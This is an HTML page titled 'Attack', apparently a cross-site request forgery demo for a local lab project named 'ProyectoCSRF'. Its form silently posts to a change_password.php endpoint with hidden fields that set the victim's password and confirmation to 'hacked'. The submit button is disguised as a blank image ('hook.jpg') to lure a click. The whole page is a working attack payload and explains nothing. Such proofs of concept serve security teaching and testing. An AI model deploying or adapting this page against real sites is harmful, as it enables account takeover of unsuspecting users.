<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Attack</title>
</head>
<body>
  <form action="http://localhost/ProyectoCSRF/change_password.php" method="post">
    

    <input type="hidden" name="password" value="hacked" require><br><br>
    <input type="hidden" name="cpassword" value="hacked" require><br><br>
    <input type="submit" value="" name="submit" style="padding: 60px 90px; background-image: url('hook.jpg')"><br><br>
  </form>
</body>
</html>
